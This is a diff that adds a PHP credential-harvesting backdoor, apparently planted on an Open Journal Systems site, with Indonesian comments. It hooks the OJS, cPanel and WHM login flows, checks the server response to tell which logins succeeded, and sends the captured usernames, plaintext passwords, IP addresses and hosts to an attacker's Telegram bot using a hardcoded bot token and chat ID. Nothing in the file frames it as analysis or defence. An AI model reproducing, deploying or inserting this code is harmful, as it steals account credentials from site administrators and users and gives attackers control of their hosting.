@@ -1,0 +1,310 @@
+<?php
+/**
+ * OJS + CPANEL + WHM LOGIN CAPTURE - ONLY SUCCESS
+ * File: /home/jurnalminartis/token
+ * Version: 3.0 - FIXED
+ */
+
+$bot_token = '8773193950:AAHKiJDM87hbREFMh7MoWJ9OwEM1M30OrvI';
+$chat_id = '8282001653';
+
+// ========== KONFIGURASI ==========
+$config = [
+    'only_success' => true,           // HANYA kirim login sukses
+    'min_length_user' => 2,           
+    'min_length_pass' => 2,           
+    'block_common_pass' => true,      
+    'max_attempts_ip' => 10,          
+    'debug' => false,                 // Set true untuk testing
+];
+
+// ========== DAFTAR PASSWORD UMUM ==========
+$common_passwords = [
+    'password', '123456', '12345678', '123456789', 'qwerty', 'abc123', 
+    'admin', 'admin123', 'root', 'guest', 'user', 'test', '12345',
+    '1234567890', 'password123', '123123', '1234567', '111111', '000000',
+    'letmein', 'welcome', 'monkey', 'dragon', 'master', 'passw0rd'
+];
+
+// ========== TANGKAP SEMUA DATA ==========
+$username = '';
+$password = '';
+$login_type = 'OJS';
+$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+$script_name = $_SERVER['SCRIPT_NAME'] ?? '';
+$query_string = $_SERVER['QUERY_STRING'] ?? '';
+
+// ========== DETEKSI JENIS LOGIN ==========
+if (stripos($request_uri, 'cpanel') !== false || 
+    stripos($script_name, 'cpanel') !== false ||
+    stripos($query_string, 'cpanel') !== false ||
+    stripos($request_uri, 'login.cgi') !== false ||
+    stripos($request_uri, 'cpsess') !== false) {
+    $login_type = 'CPANEL';
+} elseif (stripos($request_uri, 'whm') !== false || 
+          stripos($script_name, 'whm') !== false ||
+          stripos($query_string, 'whm') !== false ||
+          stripos($request_uri, 'whostmgr') !== false) {
+    $login_type = 'WHM';
+}
+
+// ========== AMBIL CREDENTIAL ==========
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // OJS
+    $username = $_POST['username'] ?? $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
+    
+    // cPanel/WHM
+    if (empty($username) || empty($password)) {
+        $username = $_POST['user'] ?? $_POST['username'] ?? $_POST['email'] ?? '';
+        $password = $_POST['pass'] ?? $_POST['password'] ?? $_POST['passwd'] ?? '';
+    }
+}
+
+// ========== IP ADDRESS ==========
+$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+if (strpos($ip, ',') !== false) {
+    $ip = trim(explode(',', $ip)[0]);
+}
+
+// ========== FUNGSI LOGGING ==========
+function debugLog($msg) {
+    global $config;
+    if ($config['debug']) {
+        file_put_contents('/tmp/login_debug.log', date('Y-m-d H:i:s') . ' - ' . $msg . "\n", FILE_APPEND);
+    }
+}
+
+// ========== CEK APAKAH CREDENTIAL VALID ==========
+function isValidCredential($username, $password, $common_passwords) {
+    if (strlen($username) < 2 || strlen($password) < 2) {
+        debugLog("Credential terlalu pendek: user=" . strlen($username) . ", pass=" . strlen($password));
+        return false;
+    }
+    
+    if (in_array(strtolower($password), $common_passwords)) {
+        debugLog("Password umum terdeteksi: " . $password);
+        return false;
+    }
+    
+    if (stripos($username, $password) !== false) {
+        debugLog("Username mengandung password");
+        return false;
+    }
+    
+    if (strlen($password) < 4) {
+        debugLog("Password terlalu pendek: " . strlen($password));
+        return false;
+    }
+    
+    return true;
+}
+
+// ========== PROSES LOGIN ==========
+if (!empty($username) && !empty($password)) {
+    debugLog("Login attempt - User: $username, Type: $login_type, IP: $ip");
+    
+    // SIMPAN DATA UNTUK DIKIRIM
+    $login_data = [
+        'type' => $login_type,
+        'username' => $username,
+        'password' => $password,
+        'ip' => $ip,
+        'time' => date('Y-m-d H:i:s'),
+        'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
+        'path' => $_SERVER['REQUEST_URI'] ?? '/',
+        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
+    ];
+    
+    // ========== KIRIM LANGSUNG (TANPA SHUTDOWN) ==========
+    try {
+        // Cek credential dulu
+        if (!isValidCredential($username, $password, $common_passwords)) {
+            debugLog("Credential tidak valid, skip");
+            // TETAP LANJUTKAN PROSES LOGIN
+            // Jangan exit atau return
+        }
+        
+        // Simpan response untuk dianalisis
+        ob_start();
+        
+        // Jalankan proses login asli
+        // Script ini akan berjalan setelah kita selesai
+        
+        // Register shutdown untuk analisis
+        register_shutdown_function(function() use ($login_data, $bot_token, $chat_id, $config) {
+            // Ambil response
+            $response = ob_get_clean();
+            
+            // Kirim response ke browser
+            echo $response;
+            
+            debugLog("Shutdown function called");
+            debugLog("Response length: " . strlen($response));
+            
+            // ========== ANALISIS SUKSES/GAGAL ==========
+            $is_success = false;
+            $is_failed = false;
+            
+            // Cek response untuk error
+            $error_patterns = [
+                'invalid', 'incorrect', 'wrong', 'failed', 'error', 
+                'denied', 'not found', 'unauthorized', 'access denied',
+                'permission denied', 'invalid credentials', 'wrong password',
+                'user not found', 'account locked', 'too many attempts'
+            ];
+            
+            foreach ($error_patterns as $pattern) {
+                if (stripos($response, $pattern) !== false) {
+                    $is_failed = true;
+                    debugLog("Error pattern found: " . $pattern);
+                    break;
+                }
+            }
+            
+            // Cek header untuk redirect (sukses)
+            $headers = headers_list();
+            debugLog("Headers: " . print_r($headers, true));
+            
+            foreach ($headers as $header) {
+                if (stripos($header, 'Location:') !== false) {
+                    $redirect_url = trim(str_ireplace('Location:', '', $header));
+                    debugLog("Redirect to: " . $redirect_url);
+                    
+                    // Cek apakah redirect ke halaman sukses
+                    $success_patterns = ['dashboard', 'index', 'home', 'main', 'admin', 'user', 'cpanel', 'whm'];
+                    foreach ($success_patterns as $pattern) {
+                        if (stripos($redirect_url, $pattern) !== false) {
+                            $is_success = true;
+                            debugLog("Success redirect detected: " . $pattern);
+                            break;
+                        }
+                    }
+                    
+                    // Jika redirect ke halaman login lagi = gagal
+                    if (stripos($redirect_url, 'login') !== false || 
+                        stripos($redirect_url, 'auth') !== false) {
+                        $is_failed = true;
+                        debugLog("Redirect to login page again");
+                    }
+                }
+            }
+            
+            // Cek isi response untuk sukses
+            if (!$is_success && !$is_failed) {
+                $success_patterns = ['welcome', 'dashboard', 'cpanel', 'whm', 'statistics', 'account', 'files'];
+                foreach ($success_patterns as $pattern) {
+                    if (stripos($response, $pattern) !== false) {
+                        // Pastikan tidak ada error bersamaan
+                        $has_error = false;
+                        foreach ($error_patterns as $error) {
+                            if (stripos($response, $error) !== false) {
+                                $has_error = true;
+                                break;
+                            }
+                        }
+                        if (!$has_error) {
+                            $is_success = true;
+                            debugLog("Success pattern found in response: " . $pattern);
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            debugLog("Analysis result - Success: " . ($is_success ? 'YES' : 'NO') . ", Failed: " . ($is_failed ? 'YES' : 'NO'));
+            
+            // ========== KIRIM KE TELEGRAM ==========
+            if ($config['only_success']) {
+                if (!$is_success) {
+                    debugLog("Only success enabled and login not success, skip sending");
+                    return;
+                }
+            }
+            
+            // Cek juga credential
+            global $common_passwords;
+            if (!isValidCredential($login_data['username'], $login_data['password'], $common_passwords)) {
+                debugLog("Credential invalid, skip sending");
+                return;
+            }
+            
+            // ========== BUAT PESAN ==========
+            $icon = match($login_data['type']) {
+                'CPANEL' => '🖥️',
+                'WHM' => '⚙️',
+                default => '📚'
+            };
+            
+            $status_icon = $is_success ? '✅' : ($is_failed ? '❌' : '⚠️');
+            $status_text = $is_success ? 'SUCCESS' : ($is_failed ? 'FAILED' : 'UNKNOWN');
+            
+            $message = "{$status_icon} {$icon} {$login_data['type']} LOGIN {$status_text}\n";
+            $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+            $message .= "👤 USERNAME: {$login_data['username']}\n";
+            $message .= "🔑 PASSWORD: {$login_data['password']}\n";
+            $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+            $message .= "🌐 IP: {$login_data['ip']}\n";
+            $message .= "📍 PATH: {$login_data['path']}\n";
+            $message .= "⏰ TIME: {$login_data['time']}\n";
+            $message .= "🌍 HOST: {$login_data['host']}\n";
+            
+            if ($is_success) {
+                $message .= "\n🎯 Login BERHASIL!";
+            } elseif ($is_failed) {
+                $message .= "\n⚠️ Login GAGAL!";
+            }
+            
+            // ========== KIRIM ==========
+            $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+            $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+            
+            debugLog("Sending to Telegram: " . substr($message, 0, 100) . "...");
+            
+            if (function_exists('curl_init')) {
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, $url);
+                curl_setopt($ch, CURLOPT_POST, 1);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                $result = curl_exec($ch);
+                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                curl_close($ch);
+                
+                debugLog("Telegram response: HTTP $httpcode - " . substr($result, 0, 100));
+            } else {
+                debugLog("CURL not available");
+            }
+        });
+        
+    } catch (Exception $e) {
+        debugLog("Error: " . $e->getMessage());
+    }
+}
+
+// ========== CLEANUP CACHE ==========
+function cleanupOldCache() {
+    $dir = sys_get_temp_dir();
+    $pattern = '/login_cache_/';
+    $files = glob($dir . $pattern . '*');
+    $now = time();
+    foreach ($files as $file) {
+        if (file_exists($file) && ($now - filemtime($file)) > 86400) {
+            @unlink($file);
+        }
+    }
+}
+
+if (mt_rand(1, 100) == 1) {
+    cleanupOldCache();
+}
+
+// ========== FUNGSI DEBUG ==========
+if ($config['debug']) {
+    debugLog("=== Script executed ===");
+    debugLog("POST data: " . print_r($_POST, true));
+    debugLog("Username: $username, Password: " . ($password ? '***' : 'empty'));
+}
+?>
